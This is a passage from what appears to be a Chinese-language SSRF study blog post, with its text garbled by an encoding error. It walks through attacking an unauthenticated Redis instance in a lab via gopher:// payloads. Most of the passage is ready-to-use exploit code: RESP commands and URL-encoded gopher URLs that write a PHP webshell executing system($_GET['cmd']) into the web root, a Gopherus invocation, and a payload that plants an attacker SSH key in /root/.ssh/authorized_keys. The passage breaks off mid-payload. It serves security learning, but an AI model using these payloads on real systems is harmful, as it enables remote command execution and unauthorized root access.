title="åˆ©ç”¨é€»è¾‘"></a>åˆ©ç”¨é€»è¾‘</h4><p>é€šè¿‡å¤‡ä»½<code>dbfilename</code>è¿™ä¸ªæ–‡ä»¶ï¼Œå°†å¤‡ä»½æ–‡ä»¶æ”¾åœ¨<code>/var/www/html/</code>è¿™ä¸ªè·¯å¾„ä¸‹ï¼Œå¹¶è®¾ç½®æ–‡ä»¶åä¸º<code>phpinfo.php</code>ï¼ŒåŒæ—¶å¤‡ä»½çš„æ•°æ®å†™å…¥<code>&lt;?php phpinfo();?&gt;</code>ï¼Œæœ€åä¿å­˜é€€å‡º</p><ul><li><strong>è®¾ç½®Webè·¯å¾„</strong></li></ul><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">config <span class="hljs-keyword">set</span> dir /var/<span class="hljs-comment">www</span>/html/<br></code></pre></td></tr></table></figure><ul><li><strong>è®¾ç½®shellæ–‡ä»¶å</strong></li></ul><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">config set dbfilename phpinfo.php<br></code></pre></td></tr></table></figure><ul><li><strong>åƒæ•°æ®åº“æ’å…¥payload</strong></li></ul><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">set payload &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;</span><br></code></pre></td></tr></table></figure><ul><li><strong>ä¿å­˜<code>Webshell</code></strong></li></ul><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">save</span><br></code></pre></td></tr></table></figure><h4 id="æœ¬åœ°æŠ“åŒ…æ„é€ "><a href="#æœ¬åœ°æŠ“åŒ…æ„é€ " class="headerlink" title="æœ¬åœ°æŠ“åŒ…æ„é€ "></a>æœ¬åœ°æŠ“åŒ…æ„é€ </h4><p>æŠ“åŒ…</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">tcpdump -i <span class="hljs-keyword">br-å®¹å™¨ID </span>tcp <span class="hljs-keyword">and </span>port <span class="hljs-number">6379</span> -w redis.pcapng<br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250424145417317.png" alt="image-20250424145417317"></p><p>ç”¨Redis-cliç™»å½•åˆ°ä¸»æœºå†…</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">redis</span>-cli -h <span class="hljs-number">172.250.250.9</span><br></code></pre></td></tr></table></figure><p>è®¾ç½®è·¯å¾„åˆ°ç½‘ç«™çš„æ ¹ç›®å½•</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">config <span class="hljs-keyword">set</span> dir /var/<span class="hljs-comment">www</span>/html/<br></code></pre></td></tr></table></figure><p>è®¾ç½®Webè·¯å¾„</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">config <span class="hljs-keyword">set</span> dir /var/<span class="hljs-comment">www</span>/html/<br></code></pre></td></tr></table></figure><p>è®¾ç½®shellæ–‡ä»¶å</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">config set dbfilename info.php<br></code></pre></td></tr></table></figure><p>åƒæ•°æ®åº“æ’å…¥payload</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">set payload &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;</span><br></code></pre></td></tr></table></figure><p>ä¿å­˜<code>Webshell</code></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">save</span><br></code></pre></td></tr></table></figure><p>æœ€åé€€å‡º</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos"><span class="hljs-keyword">quit</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250424145835373.png" alt="image-20250424145835373"></p><p>ç°åœ¨å°±æ‹¿åˆ°äº†å®Œæ•´çš„æ•°æ®åŒ…ï¼Œå¯ä»¥åœ¨æ ¹ç›®å½•æŸ¥çœ‹</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250424150105087.png" alt="image-20250424150105087"></p><p>å°†æŠ“åˆ°çš„åŒ…ç”¨Wiresharkæ‰“å¼€</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250424150311486.png" alt="image-20250424150311486"></p><p>ç­›é€‰å™¨ç­›é€‰å‡ºçº¢è‰²çš„éƒ¨åˆ†</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250424150432270.png" alt="image-20250424150432270"></p><p>å°†æ•°æ®å¤åˆ¶å‡ºæ¥ï¼Œè¿™æ˜¯ç¬¬ä¸€ä¸ªå‘½ä»¤çš„å‚æ•°</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250424151303007.png" alt="image-20250424151303007"></p><p>æ„é€ payloadæ—¶ä¸Šé¢ä¸‰è¡Œå¯åˆ å»</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250424151340968.png" alt="image-20250424151340968"></p><p>æœ€ååŠ ä¸Šquitï¼Œpayloadå¦‚ä¸‹</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-number">*4</span><br><span class="hljs-variable">$6</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">CONFIG</span><br><span class="hljs-built_in"></span><span class="hljs-variable">$3</span><br><span class="hljs-built_in">SET</span><br><span class="hljs-variable">$3</span><br>dir<br><span class="hljs-variable">$14</span><br>/var/www/html<br><span class="hljs-number">*4</span><br><span class="hljs-variable">$6</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">config</span><br><span class="hljs-built_in"></span><span class="hljs-variable">$3</span><br><span class="hljs-built_in">set</span><br><span class="hljs-variable">$10</span><br>dbfilename<br><span class="hljs-variable">$8</span><br>info.php<br><span class="hljs-number">*3</span><br><span class="hljs-variable">$3</span><br><span class="hljs-built_in">set</span><br><span class="hljs-variable">$7</span><br>payload<br><span class="hljs-variable">$19</span><br>&lt;?php phpinfo(); ?&gt;<br><span class="hljs-number">*1</span><br><span class="hljs-variable">$4</span><br>save<br><span class="hljs-number">*1</span><br><span class="hljs-variable">$4</span><br>quit<br></code></pre></td></tr></table></figure><p>é¦–å…ˆä½¿ç”¨<code>dict</code>ä¼ªåè®®æ£€æŸ¥ç½‘ç«™çš„Redisæ˜¯å¦åœ¨è¿è¡Œ</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">dict:</span><span class="hljs-comment">//172.250.250.9:6379/info</span><br></code></pre></td></tr></table></figure><p>å¦‚æœæ˜¯æœªæˆæƒçš„å°±ä¼šå¼¹å‡ºä¸€å †ä¿¡æ¯</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250424152302727.png" alt="image-20250424152302727"></p><p>å¦‚æœæ˜¯è¦æˆæƒçš„å°±ä¼šå¼¹å‡ºè®¤è¯å¤±è´¥çš„ä¿¡æ¯</p><p>æ„é€ <code>gopher</code>ä¼ªåè®®çš„payloadï¼Œé¦–å…ˆå°†payloadçš„æ¢è¡Œç¬¦æ¢æˆ<code>%0d%0a</code>ï¼Œé—®å·æ¢æˆ<code>%3f</code></p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250424152643088.png" alt="image-20250424152643088"></p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">*<span class="hljs-number">4</span>%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$3%0d%0adir%0d%0a$14%0d%0a/var/www/html%0d%0a*<span class="hljs-number">4</span>%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$8%0d%0ainfo.php%0d%0a*<span class="hljs-number">3</span>%0d%0a$3%0d%0aset%0d%0a$7%0d%0apayload%0d%0a$19%0d%0a&lt;%3fphp phpinfo(); %3f&gt;%0d%0a*<span class="hljs-number">1</span>%0d%0a$4%0d%0asave%0d%0a*<span class="hljs-number">1</span>%0d%0a$4%0d%0aquit<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gopher</span>://<span class="hljs-number">172.250.250.9:6379</span>/_*<span class="hljs-number">4</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">6</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aCONFIG%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aSET%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>adir%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">14</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a/var/www/html%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a*<span class="hljs-number">4</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">6</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aconfig%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aset%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">10</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>adbfilename%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">8</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>ainfo.php%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a*<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aset%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">7</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>apayload%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">19</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a&lt;%<span class="hljs-number">3</span>fphp phpinfo(); %<span class="hljs-number">3</span>f&gt;%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a*<span class="hljs-number">1</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">4</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>asave%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a*<span class="hljs-number">1</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">4</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aquit<br></code></pre></td></tr></table></figure><p>æäº¤</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250424152948552.png" alt="image-20250424152948552"></p><p>ç„¶åå°±å¯ä»¥ä½¿ç”¨<code>http</code>ä¼ªåè®®è®¿é—®</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.250.250.9/info.php</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250424153547262.png" alt="image-20250424153547262"></p><h4 id="ä½¿ç”¨å·¥å…·æ„é€ "><a href="#ä½¿ç”¨å·¥å…·æ„é€ " class="headerlink" title="ä½¿ç”¨å·¥å…·æ„é€ "></a>ä½¿ç”¨å·¥å…·æ„é€ </h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python2 gopherus<span class="hljs-selector-class">.py</span> <span class="hljs-attr">--exploit</span> redis<br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250424153958769.png" alt="image-20250424153958769"></p><p>æœ‰ä¸¤ä¸ªé€‰é¡¹ï¼Œç¬¬ä¸€ä¸ªæ˜¯åå¼¹shellï¼Œç¬¬äºŒä¸ªæ˜¯PHPå‘½ä»¤äº¤äº’ï¼Œè¿™é‡Œé€‰æ‹©ç¬¬äºŒä¸ª</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">PHPShell</span><br></code></pre></td></tr></table></figure><p>ç½‘ç«™æ ¹ç›®å½•æ˜¯å¦æ˜¯<code>/var/www/html</code>ï¼Œæ˜¯å°±ç›´æ¥å›è½¦</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250424154144576.png" alt="image-20250424154144576"></p><p>ç„¶åæ˜¯æ„é€ çš„payloadï¼Œå¯ä»¥ç›´æ¥å›è½¦ç”¨é»˜è®¤çš„</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250424154225610.png" alt="image-20250424154225610"></p><p>ä¼šç”Ÿæˆä¸€ä¸ª<code>shell.php</code>é¡µé¢ï¼ŒGETæ–¹æ³•æäº¤<code>cmd</code>å‚æ•°æ‰§è¡Œå‘½ä»¤</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gopher</span>://<span class="hljs-number">172.250.250.9:6379</span>/_%<span class="hljs-number">2</span>A1%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">248</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aflushall%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2</span>A3%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">243</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aset%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">241</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A1%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2434</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>Fphp%<span class="hljs-number">20</span>system%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>_GET%<span class="hljs-number">5</span>B%<span class="hljs-number">27</span>cmd%<span class="hljs-number">27</span>%<span class="hljs-number">5</span>D%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>E%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2</span>A4%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">246</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aconfig%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">243</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aset%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">243</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Adir%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2413</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A/var/www/html%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2</span>A4%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">246</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aconfig%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">243</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aset%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2410</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Adbfilename%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">249</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Ashell.php%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2</span>A1%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">244</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Asave%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A<br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250424154505121.png" alt="image-20250424154505121"></p><p>æ‰§è¡Œå‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://172.250.250.9/shell.php?cmd=<span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250424154606727.png" alt="image-20250424154606727"></p><h3 id="ä½¿ç”¨SSRFå¯¹RedisæœªæˆæƒSSHå…¬é’¥å†™å…¥"><a href="#ä½¿ç”¨SSRFå¯¹RedisæœªæˆæƒSSHå…¬é’¥å†™å…¥" class="headerlink" title="ä½¿ç”¨SSRFå¯¹RedisæœªæˆæƒSSHå…¬é’¥å†™å…¥"></a>ä½¿ç”¨SSRFå¯¹RedisæœªæˆæƒSSHå…¬é’¥å†™å…¥</h3><p>å¦‚æœå¯¹æ–¹ä¸»æœºå¼€å¯äº†SSHï¼Œå¯ä»¥å°è¯•å†™å…¥SSHå…¬é’¥æ–‡ä»¶ï¼Œç”¨è‡ªå·±çš„ç§é’¥å»è¿æ¥ï¼Œä»è€Œè¿›è¡ŒSSHç™»å½•</p><h4 id="åœ¨kaliä¸Šç”Ÿæˆç§é’¥å¯¹"><a href="#åœ¨kaliä¸Šç”Ÿæˆç§é’¥å¯¹" class="headerlink" title="åœ¨kaliä¸Šç”Ÿæˆç§é’¥å¯¹"></a>åœ¨kaliä¸Šç”Ÿæˆç§é’¥å¯¹</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ssh-keygen -t rsa</span><br></code></pre></td></tr></table></figure><p>ä¼šç”Ÿæˆåœ¨<code>root</code>ç›®å½•ä¸‹çš„<code>.ssh</code>ä¸­ï¼Œé»˜è®¤æ•²å›è½¦</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250424161301409.png" alt="image-20250424161301409"></p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250424161410956.png" alt="image-20250424161410956"></p><p>ç¬¬ä¸€ä¸ªæ˜¯ç§é’¥ï¼Œç¬¬äºŒä¸ªæ˜¯å…¬é’¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> id_rsa.pub<br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250424161513308.png" alt="image-20250424161513308"></p><p>å¯¹ä¹‹å‰çš„payloadè¿›è¡Œä¿®æ”¹ï¼Œè¦ä¿®æ”¹æ–‡ä»¶è·¯å¾„ã€æ–‡ä»¶åã€æ–‡ä»¶å†…å®¹ï¼Œæ³¨æ„åœ¨æ„é€ payloadæ—¶åœ¨å‰åéƒ½åŠ ä¸Šä¸¤ä¸ªæ¢è¡Œç¬¦ï¼Œä½¿å…¶ä¹‹åä¸å…¶ä»–å†…å®¹è¿›è¡ŒåŒºåˆ†å¼€</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-number">*4</span><br><span class="hljs-variable">$6</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">CONFIG</span><br><span class="hljs-built_in"></span><span class="hljs-variable">$3</span><br><span class="hljs-built_in">SET</span><br><span class="hljs-variable">$3</span><br>dir<br><span class="hljs-variable">$11</span><br>/root/.ssh/<br><span class="hljs-number">*4</span><br><span class="hljs-variable">$6</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">config</span><br><span class="hljs-built_in"></span><span class="hljs-variable">$3</span><br><span class="hljs-built_in">set</span><br><span class="hljs-variable">$10</span><br>dbfilename<br><span class="hljs-variable">$15</span><br>authorized_keys<br><span class="hljs-number">*3</span><br><span class="hljs-variable">$3</span><br><span class="hljs-built_in">set</span><br><span class="hljs-variable">$7</span><br>payload<br><span class="hljs-variable">$568</span><br><br><br>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCQgMRihDD5ALaOUoOBI+T2rKAGvtRQiC4MP73sCskU2JaTD41pRx999mAE4bkzoRRU5bK4FnOHKWrmxXo8FIaMu4E/iSF8H00yQvr9zO6369hqj6yfNLP3cmd6f/o6ouzlcxo2YO1oxaGPZDfd8geqFSmX7YjYS3Tpok7HvmaoV49B06f+2l35oH79SQ5RYujrC3m4TcjT0OpaIKDyB5HTod2MfyUMIsiOKQIIMuMftfpgXWSn7Q03XZEXe+0f/EluByC5HGN0rfi4uzOfCKyhsDzElWTW7MDiJ1tSLpvjaeTJihWUwYKMq8n+rw4on2c5Xu6wxa2fu6pXtFY2b+r4kiyPNhb6h00OukEK3ezNx4UZRecQ0vmDRcwBj+16UbXCs3pGHFpqabraNP04GZZr9+/pPPHUSHKSRlstoc77EmzeKaVg9m5n44LRUAgvkC0aQZak6z+flM8KKuLX58AsBRv73EBKy5goiF2UBYQba9LvFBYz3JjqtrX1GtwwmLM= root@kali<br><br><br><span class="hljs-number">*1</span><br><span class="hljs-variable">$4</span><br>save<br><span class="hljs-number">*1</span><br><span class="hljs-variable">$4</span><br>quit<br></code></pre></td></tr></table></figure><p>æ›¿æ¢æ¢è¡Œç¬¦</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">*<span class="hljs-number">4</span>%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$3%0d%0adir%0d%0a$11%0d%0a/root/.ssh/%0d%0a*<span class="hljs-number">4</span>%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$15%0d%0aauthorized_keys%0d%0a*<span class="hljs-number">3</span>%0d%0a$3%0d%0aset%0d%0a$7%0d%0apayload%0d%0a$568%0d%0a%0d%0a%0d%0assh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCQgMRihDD5ALaOUoOBI+T2rKAGvtRQiC4MP73sCskU2JaTD41pRx999mAE4bkzoRRU5bK4FnOHKWrmxXo8FIaMu4E/iSF8H00yQvr9zO6369hqj6yfNLP3cmd6f/o6ouzlcxo2YO1oxaGPZDfd8geqFSmX7YjYS3Tpok7HvmaoV49B06f+<span class="hljs-number">2</span>l35oH79SQ5RYujrC3m4TcjT0OpaIKDyB5HTod2MfyUMIsiOKQIIMuMftfpgXWSn7Q03XZEXe+<span class="hljs-number">0</span>f/EluByC5HGN0rfi4uzOfCKyhsDzElWTW7MDiJ1tSLpvjaeTJihWUwYKMq8n+rw4on2c5Xu6wxa2fu6pXtFY2b+r4kiyPNhb6h00OukEK3ezNx4UZRecQ0vmDRcwBj+<span class="hljs-number">16</span>UbXCs3pGHFpqabraNP04GZZr9+/pPPHUSHKSRlstoc77EmzeKaVg9m5n44LRUAgvkC0aQZak6z+flM8KKuLX58AsBRv73EBKy5goiF2UBYQba9LvFBYz3JjqtrX1GtwwmLM= root@kali%0d%0a%0d%0a%0d%0a*<span class="hljs-number">1</span>%0d%0a$4%0d%0asave%0d%0a*<span class="hljs-number">1</span>%0d%0a$4%0d%0aquit<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gopher</span>://<span class="hljs-number">172.250.250.9:6379</span>/_*<span class="hljs-number">4</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">6</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aCONFIG%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aSET%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>adir%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">11</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a/root/.ssh/%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a*<span class="hljs-number">4</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">6</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aconfig%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aset%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">10</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>adbfilename%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">15</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aauthorized_keys%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a*<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aset%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">7</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>apayload%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">568</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>assh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCQgMRihDD5ALaOUoOBI+T2rKAGvtRQiC4MP73sCskU2JaTD41pRx999mAE4bkzoRRU5bK4FnOHKWrmxXo8FIaMu4E/iSF8H00yQvr9zO6369hqj6yfNLP3cmd6f/o6ouzlcxo2YO1oxaGPZDfd8geqFSmX7YjYS3Tpok7HvmaoV49B06f+<span 